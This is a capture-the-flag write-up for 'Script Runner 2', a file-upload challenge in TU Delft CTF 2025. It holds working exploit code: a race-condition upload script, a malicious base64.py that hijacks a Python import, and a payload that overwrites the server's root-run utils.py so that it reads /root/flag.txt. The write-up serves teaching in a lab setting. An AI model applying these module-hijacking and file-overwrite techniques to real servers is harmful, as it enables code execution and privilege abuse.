# TU Delft CTF 2025 - Script Runner 2
* **Creator:** saus
* **Category:** misc
* **Difficulty:** Medium
* **Solves:** 4

```
Upload a script and we'll run it! Now with double the security
```



## Challenge Context

This challenge is the revenge challenge of last year's **Script Runner**

### app.py

```python
@app.route('/upload', methods=["POST"])
def upload():
    uploaded_file = request.files['file']
    if uploaded_file.filename == '':
        return render_template('index.html')

    file_path = os.path.join('uploads', secure_filename(uploaded_file.filename))
    uploaded_file.save(file_path)

    file_hash = utils.get_secure_hash(file_path)
    if not utils.is_allowed(file_hash):
        return render_template('index.html', output="Script not allowed!")

    output = utils.execute_script(file_path)

    return render_template('index.html', output=output)
```

The idea behind is simple, you upload a file and the server will run it. But there is a catch... Only files that generate one of the three hashes stored in `hashes.txt` are allowed

```
e58831678a67fd86491cf7d9b79bb13d339f4d78882ad769f6d00b81c8243a46
e551aeb1d7038870ad1047d4afa270522cf7419d9881b63898ffa9104923513c
18f8e18cfd447106a796ed4376fa13d1259558926573b4f46fef6911e93a4c41
```

These hashes correspond to the three allowed scripts: `date.sh`, `fortune.sh` and `sus.py`.

```python
def get_secure_hash(path):
    with open(path, 'rb') as f:
        content = f.read()
    insecure_hash = hashlib.sha256(content).digest()
    secure_hash = bcrypt.kdf(password=insecure_hash, salt='NaCl'.encode(), desired_key_bytes=32, rounds=256).hex()
    return secure_hash
```

Writing a script that reads the flag with [hash collision](https://en.wikipedia.org/wiki/Hash_collision) is computationally impossible as of writing, because it runs a [Key Derivation Function](https://en.wikipedia.org/wiki/Key_derivation_function) designed against brute-force attacks 256 rounds. What makes the server so secure against brute-force attacks made it vulnerable to [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) attacks, KDF is so good against brute-force attacks because it is computationally heavy (i.e. it takes a long time to calculate it). Thus, if we overwrite the content of the original file while the server is calculating and checking the hash, we will be able to run any script we want.

### Solve script by the author of Script Runner (martin)

```bash
#!/bin/sh
host="http://localhost:8080"
allowed_script="chal/static/files/date.sh"
payload="payload.sh"

curl -F "file=@$allowed_script;filename=a.sh" "$host/upload" &
sleep 0.1
curl -F "file=@$payload;filename=a.sh" "$host/upload"
```



## Back to Script Runner 2

Now, what has changed in **Script Runner 2** compared to its prequel

### TL;DR

```html
<h3>Changelog</h3>
<p>- Fix security</p>
```

Jokes aside, here is what actually changed

```python
from threading import Lock

lock = Lock()

@app.route('/upload', methods=["POST"])
def upload():
    uploaded_file = request.files['file']
    if uploaded_file.filename == '':
        return render_template('index.html')

    with lock:
        file_path = os.path.join('uploads', secure_filename(uploaded_file.filename))
        uploaded_file.save(file_path)
        utils.make_executable(file_path)

        file_hash = utils.get_file_hash(file_path)
        if not utils.is_allowed(file_hash):
            return render_template('index.html', output="Script not allowed!")

        output = utils.execute_script(file_path)

    return render_template('index.html', output=output)
```

They have added a lock which prevents the previous [race condition](https://en.wikipedia.org/wiki/Race_condition) vulnerability, other than that, nothing much has changed. Heck, they didn't even bother adding a line to delete the uploads after running it!

Now, you might wonder: "If not much has changed, why did they change the category from web to misc?"

With that question in mind, let's take look at the three allowed scripts

### sus.py

```python
#!/usr/bin/env python

import base64

SECRET = "LiDjgIDjgIDjgIDjgILjgIDjgIDjgIDjgIDigKLjgIAg44CA776f44CA44CA44CCIOOAgOOAgC4KCuOAgOOAgOOAgC7jgIDjgIDjgIAg44CA44CALuOAgOOAgOOAgOOAgOOAgOOAguOAgOOAgCDjgILjgIAuIOOAgAoKLuOAgOOAgCDjgILjgIDjgIDjgIDjgIDjgIAg4LaeIOOAgiAuIOOAgOOAgCDigKIg44CA44CA44CA44CA4oCiCgrjgIDjgIDvvp/jgIDjgIAgUmVkIHdhcyBub3QgQW4gSW1wb3N0b3Iu44CAIOOAguOAgC4KCuOAgOOAgCfjgIDjgIDjgIAgMSBJbXBvc3RvciByZW1haW5zIOOAgCDjgIDjgIDjgIIKCuOAgOOAgO++n+OAgOOAgOOAgC7jgIDjgIDjgIAuICzjgIDjgIDjgIDjgIAu44CAIC4KCg=="

b = base64.b64decode(SECRET).decode('utf-8')
print(b)
```

A simple Python script that decrypts a Base64 encoded message (decryption is left as an exercise for the reader)



## Time to reveal the answer to THE QUESTION

The way you import Python file **A** in Python file **B** is by putting them in the same directory and use `import A`, if **A.py** is not in the directory it will look at your [System Environment Variables](https://en.wikipedia.org/wiki/Environment_variable) for Python modules. This priority in Python is what we are going to exploit, remember the comment I made about uploaded files not being deleted after they are used? 

If we upload a payload named `base64.py` it will be saved in the same directory as every other uploaded file. Which means that when we upload `sus.py` after that, it will prioritize our payload over the actual [Python Base64 library](https://github.com/python/cpython/blob/3.14/Lib/base64.py).

### Dockerfile

```dockerfile
FROM python:3.12-bullseye

RUN apt update && apt install -y fortune cowsay

RUN pip3 install flask

COPY flag.txt /root/flag.txt

ENV PYTHONUNBUFFERED=1

RUN useradd user
WORKDIR /home/user

COPY --chown=user src /home/user/
RUN mkdir /home/user/uploads/
RUN chown user /home/user/uploads/

CMD ["python", "app.py"]
```

The flag is copied to `/root/flag.txt`, now that we have a [RCE](https://www.cloudflare.com/learning/security/what-is-remote-code-execution/) exploit and know the location of the flag, we can write our solve script to get the flag



## Solve Script

```python
#!/usr/bin/env python

import os
os.system("cat /root/flag.txt")
```

Upload this script as `base64.py` and upload `sus.py` after that and then we got the flag!

![noroot](.\img\noroot.png)



## Or... maybe not

### utils.py

```python
def demote():
    user_info = pwd.getpwnam("user")
    def result():
        os.setgid(user_info.pw_gid)
        os.setuid(user_info.pw_uid)
    return result

def execute_script(path):
    os.chmod(path, os.stat(path).st_mode | stat.S_IEXEC)
    proc = subprocess.run(
        [path], 
        capture_output=True, 
        preexec_fn=demote() # make sure script is not running as root
    )
    output = proc.stdout.decode('utf-8') + proc.stderr.decode('utf-8')
    return output
```

Before each script is being run in a child process, the parent process removes its root privileges leading to us not being able to read `/root/flag.txt`

Of course, there is no point in separating root and user privileges if any user can just become root as they wish. Finding this makes it seemed like a dead end, but it is actually a big hint. Because, the fact that all of these security measurements are needed means that the parent has root privileges!

### Dockerfile (again)

```dockerfile
COPY --chown=user src /home/user/
RUN mkdir /home/user/uploads/
RUN chown user /home/user/uploads/
```

Looking at the **Dockerfile** again we can see that `/home/user/` is owned by the user, this means that we can modify both `app.py` and `utils.py` (which are being executed as root)



## Solve Script (this time for real I promise)

```python
#!/usr/bin/env python

import os
import sys

PAYLOAD = """
import hashlib
import subprocess
import os
import pwd
import stat

def get_file_hash(path):
    with open(path, 'rb') as f:
        content = f.read()
    file_hash = hashlib.md5(content).hexdigest()
    return file_hash

def is_allowed(h):
    hashes = [
        "6f8bc408d4651ff51de7e7cb3e16b185",
        "d723ca2f5353f8a3a7a9ff6cae8f5cdf",
        "574ac408ee62608f03730dbbb059b924",
    ]
    return any(h == hsh.strip() for hsh in hashes)

def make_executable(path):
    user_info = pwd.getpwnam("user")
    os.chown(path, user_info.pw_uid, user_info.pw_gid)
    os.chmod(path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)

def execute_script(path):
    output = os.popen("cat /root/flag.txt").read()
    return output
"""

TARGET = os.path.join(os.path.dirname(__file__), '..', 'utils.py')

try:
    with open(TARGET, 'w') as f:
        f.write(PAYLOAD)
    print(f"[*] Injection successful")
except Exception as e:
    print(f"[*] Injection failed")
    sys.exit(1)
```

This script overwrites `utils.py` to read the flag every time when it is called to execute a script and returns the output. Now, all there is left to do is to upload this as `base64.py` and then upload `sus.py` **twice** (first time to overwrite `utils.py`, second time to get the flag)

![flag](.\img\flag.png)



## Flag

```
TUDCTF{tH@T$_4_pReT7Y_SU$sy_MODul3}
```



## Post Scriptum

Unfortunately I was a bit ill during the competition and did not manage to solve it during the CTF. Moreover, there were several occasions where I just wanted to get the solution, but I'm glad I was able to solve it myself. Surprisingly enough, this challenge with only 4 solves was solvable **with a chatbot**, as a friend of mine in a different team solved this challenge (and many others) with **Claude** 

**¯\\\_(ツ)\_/¯**
